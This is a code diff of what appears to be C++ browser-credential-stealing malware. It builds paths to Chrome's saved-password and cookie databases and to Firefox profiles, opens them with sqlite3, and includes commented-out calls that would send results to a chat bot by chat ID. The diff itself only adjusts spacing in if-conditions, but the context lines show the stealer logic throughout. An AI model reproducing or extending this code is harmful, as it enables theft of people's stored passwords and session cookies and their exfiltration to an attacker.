@@ -42,7 +42,7 @@ int main()
         firefox_pass_path += username;
         firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
 #endif
-        if( experimental::filesystem::exists(chrome_pass_path))
+        if(experimental::filesystem::exists(chrome_pass_path))
         {
             cout<<chrome_pass_path<<endl;
             cout<<"exists"<<endl;
@@ -50,7 +50,7 @@ int main()
             stringstream pass;
             
             int rc = sqlite3_open(chrome_pass_path.c_str(), &db);
-            if( rc )
+            if(rc )
             {
                 cout<<"DB Error: "<<sqlite3_errmsg(db)<<endl;
                 //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
@@ -64,7 +64,7 @@ int main()
             }
         }
 
-        if( experimental::filesystem::exists(chrome_cookies_path))
+        if(experimental::filesystem::exists(chrome_cookies_path))
         {
             cout<<chrome_cookies_path<<endl;
             cout<<"exists"<<endl;
@@ -72,7 +72,7 @@ int main()
             stringstream cookies;
 
             int rc = sqlite3_open(chrome_cookies_path.c_str(), &db);
-            if( rc )
+            if(rc )
             {
                 cout<<"DB Error: "<<sqlite3_errmsg(db)<<endl;
                 //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
@@ -86,7 +86,7 @@ int main()
             }
         }
 
-        if( experimental::filesystem::exists(firefox_pass_path))
+        if(experimental::filesystem::exists(firefox_pass_path))
         {
             cout<<firefox_pass_path<<endl;
             cout<<"exists"<<endl;
